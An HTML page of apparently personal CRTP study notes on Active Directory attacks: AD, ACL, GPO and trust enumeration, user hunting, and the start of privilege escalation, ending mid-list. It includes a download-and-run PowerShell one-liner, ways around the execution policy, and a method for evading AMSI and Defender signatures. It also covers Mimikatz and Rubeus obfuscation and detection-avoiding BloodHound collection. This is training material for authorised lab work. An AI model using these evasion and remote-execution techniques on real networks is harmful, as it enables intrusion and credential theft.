@@ -1,0 +1,2661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRTP Notes 🦞</title>
+    <style>
+        :root {
+            --bg-color: #0f0f10;
+            --container-bg: #18191b;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --accent-primary: #38bdf8;
+            --accent-secondary: #ffb26e;
+            --code-bg: #000000;
+            --border-color: #212124;
+            --hr-color: #212124;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            margin: 0;
+            padding: 2rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        .content-wrapper {
+            max-width: 900px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            color: #FE8925;
+        }
+
+        h2, h3, h4 {
+            color: #FE8925;
+            margin-top: 1.5rem;
+        }
+
+        details {
+            background: var(--container-bg);
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        details[open] {
+            border-color: #FE8925;
+        }
+
+        summary {
+            font-weight: bold;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 0.5rem 0;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        summary:hover {
+            color: #FE8925;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            padding: 1.2rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            color: #e2e8f0;
+        }
+
+        code {
+            font-family: 'Fira Code', 'Courier New', monospace;
+            font-size: 0.95rem;
+            color: var(--accent-secondary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: var(--container-bg);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--border-color);
+            color: #FE8925;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            letter-spacing: 0.05em;
+        }
+
+        tr:hover {
+            background-color: rgba(56, 189, 248, 0.05);
+        }
+
+        hr {
+            border: 0;
+            height: 1px;
+            background: var(--hr-color);
+            margin: 2rem 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 1rem 0;
+            border: 1px solid var(--border-color);
+        }
+
+        a {
+            color: #FE8925;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        span[style*="color:red"] {
+            color: #ef4444 !important;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="content-wrapper">
+<h1><code>CRTP</code> Notes 🦞</h1>
+<details>
+<summary><span style="font-weight: bold;">&lt;/&gt;</span> PowerShell
+</summary><h3>🧠 Main Concepts</h3>
+
+<ul>
+<li>How to Load a PowerShell <code>script</code><br />
+<pre><code> .C:\AD\Tools\PowerView.ps1
+</code></pre></li>
+<li>How to Load a PowerShell <code>module</code> (or a <code>script</code>)<br />
+<pre><code> Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
+</code></pre></li>
+<li>How to list the commands of a PowerShell <code>module</code><br />
+<pre><code> Get-Command -Module &lt;modulename&gt;
+</code></pre></li>
+<li>How to execute PowerShell <code>script</code> in memory 
+
+<pre><code> iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+</code></pre>
+
+🛡️ Windows introduced <strong>AMSI</strong> in <strong>PowerShell 5</strong> to protect against this type of attack
+
+<ul>
+<li>it can be logged by <code>Transcription and Script Block logging</code></li>
+</ul></li>
+</ul>
+
+<hr />
+
+<h3>🔐 Execution Policy</h3>
+
+It is <span style="color:red;"><strong>NOT</strong></span> a security measure, it is present to prevent user from <strong>accidently executing scripts</strong>.<br />
+- Several ways to bypass<br />
+  <pre><code>powershell -ExecutionPolicy bypass 
+powershell -c &lt;cmd&gt;
+powershell -encodedcommand
+$env:PSExecutionPolicyPreference="bypass"
+</code></pre>
+
+<h3>🎭 Bypassing PowerShell Security</h3>
+
+<code>You can use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.</code>
+
+Invisi-Shell bypasses all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking .Net assemblies.
+
+<h4>⚔️ Using Invisi-Shell</h4>
+
+<ul>
+<li>With <strong>admin</strong> privileges:<br />
+<pre><code>RunWithPathAsAdmin.bat
+</code></pre></li>
+<li>With <strong>non-admin</strong> privileges:<br />
+<pre><code>RunWithRegistryNonAdmin.bat
+</code></pre><br />
+<code>Type exit from the new PowerShell session to complete the clean-up.</code></li>
+</ul>
+
+<h3>🎭 Bypassing Windows AV Security</h3>
+
+You can use the <strong>AMSITrigger</strong> <code>https://github.com/RythmStick/AMSITrigger</code> or <strong>DefenderCheck</strong> <code>https://github.com/t3hbb/DefenderCheck</code> to identify code and strings from a binary or script that<br />
+<strong>Windows Defender</strong> may flag. 
+
+<ul>
+<li>Example:
+
+<ul>
+<li>Simply provide path to the script file to scan it:<br />
+<pre><code>AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
+</code></pre></li>
+</ul>
+
+<pre><code>DefenderCheck.exe PowerUp.ps1
+</code></pre>
+
+<strong>Invoke-Obfuscation</strong> <code>https://github.com/danielbohannon/Invoke-Obfuscation</code> is a PowerShell Script <strong>Obfuscator</strong></li>
+<li>Steps to avoid signature based detection are pretty simple:<br /><br />
+1) Scan using <strong>AMSITrigger</strong><br /><br />
+2) <strong>Modify</strong> the detected code snippet<br /><br />
+3) Rescan using <strong>AMSITrigger</strong><br /><br />
+4) <strong>Repeat</strong> the steps 2 &amp; 3 till we get a result as <code>AMSI_RESULT_NOT_DETECTED</code> or <code>Blank</code></li>
+<li>Example:<br /><br />
+ <pre><code> New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+ </code></pre><br /><br />
+ if "Net.Sockets" detected you can reverse it to bypass<br /><br />
+<pre><code> $String = "stekcoS.teN"
+ $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach 
+ {$_.value}) -join ''
+ if ($Reverse)
+ {
+   $client = New-Object System.$class.TCPClient($IPAddress,$Port)
+   }
+</code></pre></li>
+</ul>
+
+<h4>✂️ Tools Script Modification</h4>
+
+Using only the minimal portion of a script is also useful. Like whin using <code>PowerUp.ps1</code> or <code>Invoke-Mimikatz</code> <span style="color:red;"><strong>remove</strong></span> all unnecessarily functionalaty
+
+<h5>💪 PowerUp.ps1</h5>
+
+<ul>
+<li>For this we can scan the script with <strong>DefenderCheck</strong> and then use the<br />
+<code>ByteToLineNumber.ps1</code> script with the output byte to tell you what line is detected</li>
+</ul>
+
+<h5>🐈 Invoke-Mimikatz</h5>
+
+There are multiple detections. We need to make the following changes:<br />
+<ol>
+  <li>Remove default <strong>comments</strong>.</li>
+  <li><strong>Rename</strong> the <strong>script</strong>, <strong>function</strong> names and <strong>variables</strong>.</li>
+  <li>Modify the <strong>variable names</strong> of the <strong>Win32 API</strong> calls that are detected.</li>
+  <li><strong>Obfuscate PEBytes</strong> content &rarr; <strong>PowerKatz</strong> dll using packers.</li>
+  <li>Implement a <strong>reverse</strong> function for <strong>PEBytes</strong> to avoid any static signatures.</li>
+  <li>Add a sandbox check to waste dynamic analysis resources.</li>
+  <li><strong>Remove</strong> Reflective PE <strong>warnings</strong> for a clean output.</li>
+  <li>Use obfuscated commands for Invoke-MimiEx execution.</li>
+  <li>Analysis using <strong>DefenderCheck</strong>.</li>
+</ol>
+</details><hr />
+<details>
+<summary>🧰 .NET Tools
+</summary><h3>📌 Overview</h3>
+
+.NET tools, refer to binaries or utilities written in C# using the .NET framework/runtime.
+
+written in .NET languages like C#, VB.NET, or F#, and compiled with the .NET compiler.
+
+<hr />
+
+<h4>🧭 Examples</h4>
+
+<table>
+<thead>
+<tr>
+  <th>Tool / Binary</th>
+  <th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>SharpHound</td>
+  <td>Part of BloodHound, written in C#. Used for AD enumeration.</td>
+</tr>
+<tr>
+  <td>Seatbelt</td>
+  <td>Post-exploitation system information tool in C#.</td>
+</tr>
+<tr>
+  <td>SharpDump</td>
+  <td>LSASS memory dumper (like Mimikatz) in .NET.</td>
+</tr>
+<tr>
+  <td>SharpUp</td>
+  <td>Privilege escalation checks, written in C#.</td>
+</tr>
+<tr>
+  <td>Rubeus</td>
+  <td>Kerberos abuse tool, written in .NET.</td>
+</tr>
+<tr>
+  <td>Certify</td>
+  <td>Abuses AD CS for escalation, also .NET-based.</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h4>🛠 AV bypass</h4>
+
+<h5>🌀 Source Code Obfuscation</h5>
+
+1) <strong>Codecepticon</strong> <code>https://github.com/Accenture/Codecepticon</code> can obfuscate the source code to bypass any signature-related detection.
+
+<code>Codecepticon needs to be compiled in Visual Studio and it’s command line 
+generator can help generate an obfuscation command quickly.</code>
+
+<strong>Example</strong>:<br />
+  + You can also use the following command to obfuscate the source code with Codecepticon:<br />
+  <pre><code>C:\AD\Tools\Codecepticon.exe --action obfuscate --module csharp --verbose --path "C:\AD\Tools\Rubeus-master\Rubeus.sln" --map-file " C:\AD\Tools\Rubeus-master\Mapping.html" --profile rubeus --renamencefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 -markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewritemethod xor 
+  </code></pre><br />
+2)  <strong>ConfuserEx</strong> <code>https://mkaring.github.io/ConfuserEx/</code> is a great tool to obfuscate the compiled <strong>binary</strong><br />
+   + ConfuserEx is a GUI beasd .NET obfuscater can be used for (.exe and .dll)
+</details><hr />
+<details>
+<summary>🎯 Assume Breach Methodology
+</summary><h3>📌 Overview</h3>
+
+It is more likely that an organization has <strong>already been compromised</strong>, but just hasn't discovered it yet.
+
+<hr />
+
+<h2>🔪 Attack Methodology</h2>
+
+<img src="img/Attack%20Methodology-NoBG.png" alt="Attack Methodology" />
+</details><hr />
+<details>
+<summary>🔍 Domain Enumeration 
+</summary><h4>🛠️ Domain Enumeration Tools</h4>
+
+<table>
+<thead>
+<tr>
+  <th>Tool</th>
+  <th>Language</th>
+  <th>Description / Notes</th>
+  <th>Link</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>ActiveDirectory Module</td>
+  <td>PowerShell</td>
+  <td>Microsoft-signed module, works even in PowerShell CLM.</td>
+  <td><a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">Docs</a> <br> <a href="https://github.com/samratashok/ADModule">GitHub</a></td>
+</tr>
+<tr>
+  <td>BloodHound</td>
+  <td>C# / PowerShell</td>
+  <td>Collects and visualizes AD data for privilege escalation paths.</td>
+  <td><a href="https://github.com/BloodHoundAD/BloodHound">GitHub</a></td>
+</tr>
+<tr>
+  <td>PowerView</td>
+  <td>PowerShell</td>
+  <td>AD recon and enumeration tool. Part of PowerSploit.</td>
+  <td><a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1">GitHub</a></td>
+</tr>
+<tr>
+  <td>SharpView</td>
+  <td>C#</td>
+  <td>AD enumeration tool, doesn’t support pipeline filtering.</td>
+  <td><a href="https://github.com/tevora-threat/SharpView/">GitHub</a></td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h3>🔪 Domain Enumeration Commands</h3>
+
+
+<details>
+<summary>📡 PowerView &amp; ActiveDirectory Module
+</summary><ul>
+<li>Get current domain<br />
+<pre><code>Get-Domain (PowerView)
+Get-ADDomain (ActiveDirectory Module)
+</code></pre></li>
+<li>Get object of another domain<br />
+<pre><code>Get-Domain -Domain moneycorp.local
+Get-ADDomain -Identity moneycorp.local
+</code></pre></li>
+<li>Get domain SID for the current domain<br />
+<pre><code>Get-DomainSID
+(Get-ADDomain).DomainSID
+</code></pre></li>
+<li>Get domain policy for the current domain<br />
+<pre><code>Get-DomainPolicyData
+(Get-DomainPolicyData).systemaccess
+</code></pre></li>
+<li>Get domain policy for another domain<br />
+<pre><code>(Get-DomainPolicyData -domain moneycorp.local).systemaccess
+</code></pre></li>
+<li>Get domain controllers for the current domain<br />
+<pre><code>Get-DomainController
+Get-ADDomainController
+</code></pre></li>
+<li>Get domain controllers for another domain<br />
+<pre><code>Get-DomainController -Domain moneycorp.local
+Get-ADDomainController -DomainName moneycorp.local -Discover
+</code></pre></li>
+<li>Get a list of users in the current domain<br />
+<pre><code>Get-DomainUser
+Get-DomainUser -Identity student1
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Identity student1 -Properties * 
+</code></pre></li>
+<li>Get list of all properties for users in the current domain<br />
+<pre><code>- Get-DomainUser -Identity student1 -Properties * 
+- Get-DomainUser -Properties samaccountname,logonCount
+- Get-ADUser -Filter * -Properties * | select -First 1 |  Get-Member
+-MemberType *Property | select Name
+- Get-ADUser -Filter * -Properties * | select name,logoncount,@ {expression={[datetime]::fromFileTime($_.pwdlastset)}}
+</code></pre></li>
+<li>Search for a particular string in a user's attributes:<br />
+<pre><code>Get-DomainUser -LDAPFilter "Description=*built*" | Select name, Description 
+Get-ADUser -Filter 'Description -like "*built*"' -Properties  Description | select name,Description
+</code></pre></li>
+<li>Get a list of computers in the current domain<br />
+<pre><code>Get-DomainComputer | select Name
+Get-DomainComputer -OperatingSystem "*Server 2022*"
+Get-DomainComputer -Ping
+Get-ADComputer -Filter * | select Name
+Get-ADComputer -Filter * -Properties *
+Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"'  -Properties OperatingSystem | select Name,OperatingSystem
+Get-ADComputer -Filter *  -Properties DNSHostName | % {Test-Connection -Count 1 -ComputerName $_.DNSHostName}
+</code></pre></li>
+<li>Get all the groups in the current domain<br />
+<pre><code>Get-DomainGroup | select Name
+Get-DomainGroup -Domain &lt;targetdomain&gt;
+Get-ADGroup -Filter * | select Name 
+Get-ADGroup -Filter * -Properties *
+</code></pre></li>
+<li>Get all groups containing the word "admin" in group name<br />
+<pre><code>Get-DomainGroup *admin*
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name 
+</code></pre></li>
+<li>Get all the members of the Domain Admins group<br />
+<pre><code>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+  Get-ADGroupMember -Identity "Domain Admins" -Recursive 
+- Get the group membership for a user: 
+  ```powershell
+  Get-DomainGroup -UserName "student1"
+  Get-ADPrincipalGroupMembership -Identity student1 
+</code></pre></li>
+<li>List all the local groups on a machine (needs administrator privs   on non-dc machines) :<br />
+<pre><code>Get-NetLocalGroup -ComputerName dcorp-dc
+</code></pre></li>
+<li>Get members of the local group "Administrators" on a machine  (needs administrator privs on non-dc machines) :<br />
+<pre><code>Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName   Administrators
+</code></pre></li>
+<li>Get actively logged users on a computer (needs local admin rights   on the target)<br />
+<pre><code>Get-NetLoggedon -ComputerName dcorp-adminsrv
+</code></pre></li>
+<li>Get locally logged users on a computer (needs remote registry on  the target - started by-default on server OS)<br />
+<pre><code>Get-LoggedonLocal -ComputerName dcorp-adminsrv
+</code></pre></li>
+<li>Get the last logged user on a computer (needs administrative  rights and remote registry on the target)<br />
+<pre><code>Get-LastLoggedOn -ComputerName dcorp-adminsrv
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>📁 Shares Enumeration
+</summary><ul>
+<li>Find shares on hosts in current domain.<br />
+<pre><code>Invoke-ShareFinder -Verbose
+</code></pre></li>
+<li>Find sensitive files on computers in the domain<br />
+<pre><code>Invoke-FileFinder -Verbose
+</code></pre></li>
+<li>Get all fileservers of the domain<br />
+  <pre><code>Get-NetFileServer
+  </code></pre>
+
+<h4>📂 Another way of Shares Enumeration</h4>
+
+You can use <strong>PowerHuntShares</strong> tool for enumerating shares    <a href="https://github.com/NetSPI/PowerHuntShares">GitHub</a>
+
+It can discover shares, sensitive files, ACLs for shares,  networks,<br />
+computers, identities etc. and generates a nice HTML report. 
+
+<strong>Example</strong>:
+
+<pre><code>Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList   C:\AD\Tools\servers.txt
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🐶 BloodHound
+</summary>Provides GUI for AD entities and relationships for the data   collected by its ingestors.
+
+<ul>
+<li>There are two free versions of <strong>BloodHound</strong>
+
+<ol>
+<li>BloodHound <strong>Legacy</strong> - <a href="https://github.com/ BloodHoundAD/BloodHound">GitHub</a>
+
+<ul>
+<li>Supply data to BloodHound:
+
+<pre><code>C:\AD\Tools\Loader.exe -Path  C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\S harpHound.exe -args --collectionmethods All
+</code></pre>
+
+ℹ️ The gathered data can be uploaded to the BloodHound   Legacy application</li>
+</ul></li>
+<li>BloodHound <strong>CE</strong> (Community Edition) - <a href="https:// github.com/SpecterOps/BloodHound">GitHub</a>
+<ul>
+<li>Supply data to BloodHound:<br /><br />
+<pre><code>C:\AD\Tools\Loader.exe -Path  C:\AD\Tools\Sharphound\SharpHound.exe args   --collectionmethods All
+<br />
+</code></pre><br /><br />
+ ℹ️ The gathered data can be uploaded to the BloodHound CE.</li>
+</ul></li>
+</ol>
+
+<h4>🥷 Stealthy BloodHound</h4>
+
+To make BloodHound collection stealthy, remove noisy collection<br />
+methods like RDP, DCOM, PSRemote and LocalAdmin. </li>
+<li>Use the -ExcludeDCsto avoid detection by MDI:<br />
+  <pre><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound\SharpHound. exe -args --collectionmethods 
+Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps, SPNTargets,CertServices --excludedcs 
+  </code></pre><br />
+  ℹ️ Remember to remove the '<strong>CertServices</strong>' collection method   when using <strong>BloodHound</strong> <strong>legacy</strong> collector.
+
+<h4>🧙‍♂️ SOAPHound</h4>
+
+Use SOAPHound for even more stealth.<br />
+It talks to Active Driectory Web Services (ADWS - Port 9389) in   place of sending 
+
+LDAP queries - just like the AD Module. – Almost no network-based   detection (like MDI).–<br />
+It retrieves information about all objects(objectGuid=*) and then   process them.  
+
+⚠️ It means limited LDAP queries - less chance of endpoint  detection.
+
+</br></li>
+<li>Build a cache that includes basic info about domain objects. 
+
+<pre><code>SOAPHound.exe --buildcache -c C:\AD\Tools\cache.txt
+</code></pre></li>
+<li>Collect BloodHound compatible data<br />
+<pre><code>SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o  C:\AD\Tools\bloodhound-output --nolaps
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>📃 ACLs Enumeration
+</summary><ul>
+<li><strong>Access Control Model (ACM)</strong>
+<ul>
+<li>Enables control on the ability of a process to access objects   and other resources in active directory based on:<br /><br />
+1) <strong>Access Tokens</strong> (security context of a process -   identity and privs of user)<br /><br />
+2) <strong>Security Descriptors</strong> (SID of the owner, Discretionary  ACL (DACL) and System ACL (SACL))</li>
+</ul></li>
+<li><strong>Access Control List (ACL)</strong><br />
+    + It is a list of <strong>Access Control Entries (ACE)</strong> - <strong>ACE</strong>  corresponds to individual permission or audits access. Who has   permission and what can be done on an object?<br />
+      1)  <strong>DACL</strong> - Defines the permissions trustees (a user or  group) have on an object.<br />
+      2) <strong>SACL</strong> - Logs success and failure audit messages when an   object is accessed. 
+
+<img src="img/ACLs.png" alt="ACLs" />
+
+<h3>🔍 ACLs Enumeration Commands</h3></li>
+<li>Get the ACLs associated with the specified object
+
+<pre><code>Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
+</code></pre></li>
+<li>Get the ACLs associated with the specified prefix to be used for  search<br />
+<pre><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,  DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+</code></pre></li>
+<li>We can also enumerate ACLs using ActiveDirectory module but   without resolving GUIDs<br />
+<pre><code>(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,  DC=moneycorp,DC=local').Access
+</code></pre></li>
+<li>Search for interesting ACEs<br />
+<pre><code>Find-InterestingDomainAcl -ResolveGUIDs
+</code></pre></li>
+<li>Get the ACLs associated with the specified path<br />
+<pre><code>Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>📂 Group Policy &amp; OU
+</summary>#### 👪 GPO<br />
+  Group Policy provides the ability to manage configuration and changes easily and centrally in AD.
+
+<ul>
+<li>A policy setting may only affect a computer or a user.
+
+<ul>
+<li><strong>For Computers</strong> - Security settings, startup and shutdown scripts, assigned applications and more. </li>
+<li><strong>For Users</strong> - Security settings, logon and logoff scripts,  assigned applications and more.</li>
+</ul>
+
+ℹ️ <strong>Group Policy</strong> settings are contained in a <strong>Group Policy Object (GPO)</strong>. 
+
+A <strong>GPO</strong> is a virtual collection of policy settings, security permissions, and scope of management (SOM) that you can apply to users and computers.
+
+ℹ️ <strong>GPO</strong> can be linked to <strong>domains</strong>, <strong>sites</strong> and <strong>organizational units (OUs)</strong>.
+
+<h4>📁 OU</h4>
+
+<strong>Organizational Units (OUs)</strong>  is the lowest-level AD container to which GPO can be applied.
+
+ℹ️ Attacks at the OU level due to misconfigured or overly permissive GPOs is most common in enterprise environments.
+
+ℹ️ Overly permissive <strong>GPOs</strong> can be abused for various attacks like <strong>privesc</strong>, <strong>backdoors</strong>, <strong>persistence</strong> etc.
+
+<h3>🔍 GPO &amp; OU Enumeration Commands</h3></li>
+<li>Get list of GPO in current domain.
+
+<pre><code>Get-DomainGPO
+Get-DomainGPO -ComputerIdentity dcorp-student1
+</code></pre></li>
+<li>Get GPO(s) which use Restricted Groups or groups.xml for interesting users
+
+<pre><code>Get-DomainGPOLocalGroup
+</code></pre></li>
+<li>Get users which are in a local group of a machine using GPO
+
+<pre><code>Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity   dcorp-student1
+</code></pre></li>
+<li>Get machines where the given user is member of a specific group
+
+<pre><code>Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
+</code></pre></li>
+<li>Get OUs in a domain
+
+<pre><code>Get-DomainOU
+Get-ADOrganizationalUnit -Filter * -Properties *
+</code></pre></li>
+<li>Get GPO applied on an OU. Read GPOname from gplink attribute   from Get-NetOU
+
+<pre><code>Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}"
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🌳 Trusts &amp; Forest
+</summary>In an AD environment, <strong>trust</strong> is a relationship <strong>between two domains or forests</strong> which allows users of one domain or forest to access <strong>resources</strong> in the other domain or forest.<br />
+  - <strong>Trust can be</strong>:<br />
+      + <strong>Automatic</strong> (parent-child, same forest etc.)<br />
+      + <strong>Established</strong> (forest, external). 
+
+ℹ️ <strong>Trusted Domain Objects (TDOs)</strong> represent the trust relationships in a domain. 
+
+<hr />
+
+#### 🧭 Trust Direction<br />
+  1) <strong>One-way trust</strong> - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.<br />
+     <img src="img/TD1.png" alt="ACLs" /><br />
+  3) <strong>Two-way trust</strong> - Bi-directional. Users of both domains can access resources in the other domain.<br />
+     <img src="img/TD2.png" alt="ACLs" />
+
+<hr />
+
+<ul>
+<li>🚇 <strong>Transitivity</strong>
+
+Can be extended to establish trust relationships   with other domains.
+
+ℹ️ All the default <strong>intra-forest</strong> trust relationships  (<strong>Tree-root</strong>, <strong>Parent-Child</strong>) between domains within a same  forest are transitive <strong>two-way trusts</strong>. </li>
+<li>🚱 <strong>Nontransitive</strong>
+
+Cannot be extended to other domains in the  forest. Can be two-way or one-way. 
+
+ℹ️ This is the default trust (called external trust) between  two   domains in different forests when forests do not have a  trust   relationship.</li>
+</ul>
+
+<hr />
+
+### 🔗 Trust Types
+
+1) 👪 <strong>Parent-child trust</strong><br />
+      + It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. For example, dollarcorp.moneycorp.local is a child of moneycorp.local<br />
+      + This trust is always <strong>two-way transitive</strong>.
+
+2) 🫚 <strong>Tree-root trust</strong><br />
+      + It is created automatically between whenever a new domain tree is added to a forest root.<br />
+      + This trust is always <strong>two-way transitive</strong>. 
+
+<pre><code>  ![TRPCH](img/TRPCH.png)
+</code></pre>
+
+3) 👽 <strong>External Trusts</strong>
+
+<pre><code>  Between **two domains** in **different forests** when forests do not have a trust relationship.
+
+  ℹ️ Can be **one-way** or **two-way** and is **nontransitive**.
+
+  ![ExT](img/ExT.png)
+</code></pre>
+
+4) 🌲 <strong>Forest Trusts</strong>
+
+<pre><code> Between forest **root domain**. And cannot be extended to a third forest (**no implicit trust**). 
+
+ ℹ️ Can be **one-way** or **two-way transitive**. 
+
+ ![FT](img/FT.png)
+</code></pre>
+
+<hr />
+
+### 🔍 Domain Trust &amp; Forest mapping
+
+<ul>
+<li>Get a list of all domain trusts for the current domain<br />
+<pre><code>Get-DomainTrust
+Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
+Get-ADTrust
+Get-ADTrust -Identity us.dollarcorp.moneycorp.local
+</code></pre></li>
+<li>Get details about the current forest<br />
+<pre><code>Get-Forest
+Get-Forest -Forest eurocorp.local
+Get-ADForest
+Get-ADForest -Identity eurocorp.local 
+</code></pre></li>
+<li>Get all domains in the current forest<br />
+<pre><code>Get-ForestDomain
+Get-ForestDomain -Forest eurocorp.local
+(Get-ADForest).Domains 
+</code></pre></li>
+<li>Get all global catalogs for the current forest<br />
+<pre><code>Get-ForestGlobalCatalog
+Get-ForestGlobalCatalog -Forest eurocorp.local
+Get-ADForest | select -ExpandProperty GlobalCatalogs 
+</code></pre></li>
+<li>Map trusts of a forest (no Forest trusts in the lab)<br />
+<pre><code>Get-ForestTrust
+Get-ForestTrust -Forest eurocorp.local
+Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🏹 User Hunting
+</summary>1) Find all machines on the current domain where the current <strong>user has local admin access</strong><br />
+     <pre><code>Find-LocalAdminAccess -Verbose<br />
+     </code></pre><br />
+       + This can also be done with the help of remote  administration tools like <strong>WMI</strong> and <strong>PowerShell  remoting</strong>. Pretty useful in cases ports (<strong>RPC</strong> and  <strong>SMB</strong>) used by <code>Find-LocalAdminAccess</code> are <strong>blocked</strong>.<br />
+         <pre><code> Find-WMILocalAdminAccess.ps1 
+ Find-PSRemotingLocalAdminAccess.ps1<br />
+         </code></pre>
+
+<pre><code> What dose `Find-LocalAdminAccess` command do:
+
+ ![FLAA](img/FLAA.png)
+
+ ℹ️ This function queries the DC of the current or provided  domain for a list of computers `Get-NetComputer` and then use  multi-threaded `Invoke-CheckLocalAdminAccess` on each machine.
+</code></pre>
+
+2) Find computers where a domain admin (or specified user/group) has <strong>sessions</strong>:<br />
+     <pre><code>Find-DomainUserLocation -Verbose
+Find-DomainUserLocation -UserGroupIdentity "RDPUsers"<br />
+     </code></pre>
+
+<pre><code>  + Note that for **Server 2019** and onwards, &lt;span style="color:red;"&gt;**local administrator**&lt;/span&gt; privileges are required to list sessions. 
+
+ What dose `Find-DomainUserLocation` command do:
+
+ ![FDUL](img/FDUL.png)
+
+ ℹ️ This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using `Get-DomainGroupMember`, gets a list of computers `Get-DomainComputer` and list sessions and logged on users `Get-NetSession/Get-NetLoggedon` from each machine.
+</code></pre>
+
+3) Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).<br />
+     <pre><code>Find-DomainUserLocation -CheckAccess<br />
+     </code></pre>
+
+4) Find computers (File Servers and Distributed File servers) where a domain admin session is available.<br />
+     <pre><code>Find-DomainUserLocation -Stealth<br />
+     </code></pre>
+
+5) List sessions on remote machines <a href="https://github.com/Leo4j/Invoke-SessionHunter">GitHub</a><br />
+     <pre><code> Invoke-SessionHunter -FailSafe<br />
+     </code></pre><br />
+     ℹ️ Above command doesn’t need admin access on remote machines. Uses Remote Registry and queries HKEY_USERS hive.
+
+<pre><code>  + An opsec friendly command would be (avoid connecting to all the target machines by specifying targets)
+    &lt;pre&gt;&lt;code&gt;Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
+    &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+</details>
+</details><hr />
+<details>
+<summary>🔝 Privilege Escalation 
+</summary><h3>📌 Overview</h3>
+
+In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:<br />
+- Hunting for <strong>Local Admin</strong> access on other machines<br />
+- Hunting for high privilege domain accounts (like a <strong>Domain Administrator</strong>)
+
+<hr />
+
+<h4>🖥️ Local Privilege Escalation</h4>
+
+There are various ways of locally escalating privileges on Windows box:<br />
+ 1) Missing patches<br />
+ 2) Automated deployment and AutoLogon passwords in clear text<br />
+ 3) AlwaysInstallElevated (Any user can run MSI as SYSTEM)<br />
+ 4) Misconfigured Services<br />
+ 5) DLL Hijacking and more<br />
+ 6) Kerberos and NTLM Relaying
+
+<ul>
+<li>We can use below <strong>tools</strong> for complete coverage
+<ul>
+<li><strong>PowerUp</strong>: <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">GitHub</a></li>
+<li><strong>Privesc</strong>: <a href="https://github.com/itm4n/PrivescCheck">GitHub</a></li>
